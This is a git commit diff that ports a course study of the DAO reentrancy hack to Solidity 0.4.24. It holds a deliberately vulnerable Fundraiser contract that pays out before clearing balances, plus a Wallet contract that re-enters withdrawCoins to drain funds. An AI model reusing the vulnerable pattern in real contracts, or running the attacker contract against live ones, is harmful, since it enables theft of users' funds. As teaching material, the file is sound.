0e6e37db7a9f21f660dbde34039f63e06e2bbca7
Antonio Furtado <antoniordf@hotmail.com>
2023-04-13 22:49:31 +0100

    Refactored contract back to Solidity 0.4.24. Can't get the contract to run properly in Remix. There is something wrong with the example provided by Udacity

--- vulnerableContract.sol
+++ vulnerableContract.sol
@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 
-pragma solidity ^0.8.19;
+pragma solidity ^0.4.24;
 
 // This is a study of The Dao $60 million hack and which vulnerability enabled the hack.
 
@@ -10,57 +10,57 @@ contract Fundraiser {
   // This function is vulnerable to reentrancy attack, where the attacker makes recursive calls to the function. Notice how the function first
   // makes a payout to the caller before setting the balance to zero. A caller could exploit this to keep making payments out before the function
   // ever getting to change the balance to zero.
-  function withdrawCoins() public {
+  function withdrawCoins() {
     uint withdrawAmount = balances[msg.sender];
-    Wallet wallet = Wallet(payable(msg.sender));
-    wallet.payout{ value: withdrawAmount }(); // In this line, the "payout" function in an external contract. We don't really know what the payout function in that contract is designed to do.
+    Wallet wallet = Wallet(msg.sender);
+    wallet.payout.value(withdrawAmount)(); // In this line, the "payout" function in an external contract. We don't really know what the payout function in that contract is designed to do.
     balances[msg.sender] = 0;
   }
 
   // Within the "payout" function in the wallet contract, an attacker could recursively call the withdrawCoins() function again, preventing the withdrawCoins
   // function from ever setting the balance to zero and thus draining funds from the contract. See the implementation of the attack below.
 
-  function getBalance() public view returns (uint) {
+  function getBalance() constant returns (uint) {
     return address(this).balance;
   }
 
-  function contribute() public payable {
+  function contribute() payable {
     balances[msg.sender] += msg.value;
   }
 
-  receive() external payable {}
+  function() payable {}
 }
 
 contract Wallet {
   Fundraiser fundraiser;
   uint recursion = 20; // Loop counter.
 
-  constructor(address fundraiserAddress) {
-    fundraiser = Fundraiser(payable(fundraiserAddress));
+  function Wallet(address fundraiserAddress) {
+    fundraiser = Fundraiser(fundraiserAddress);
   }
 
-  function contribute(uint amount) public payable {
-    require(msg.value == amount, "Amount mismatch");
-    payable(address(fundraiser)).transfer(amount);
-    fundraiser.contribute();
+  function contribute(uint amount) {
+    fundraiser.contribute.value(amount)();
   }
 
-  function withdraw() public {
+  function withdraw() {
     fundraiser.withdrawCoins();
   }
 
-  function getBalance() public view returns (uint) {
+  function getBalance() constant returns (uint) {
     return address(this).balance;
   }
 
   // Here we will make a recursive call to the withdrawCoins() function in the fundraiser contract, however we can't make infinite calls or we will crash
   // the contract. So we will need a loop (see above for loop counter and below for loop).
-  function payout() public payable {
+  function payout() payable {
     if (recursion > 0) {
       recursion--;
-      fundraiser.withdrawCoins(); // When the function payout() is called it will simply call the withdrawCoins() function in the fundraiser contract, creating a recursive behaviour.
+      fundraiser.withdrawCoins();
     }
   }
 
-  receive() external payable {}
+  // When the function payout() is called it will simply call the withdrawCoins() function in the fundraiser contract, creating a recursive behaviour.
+
+  function() payable {}
 }
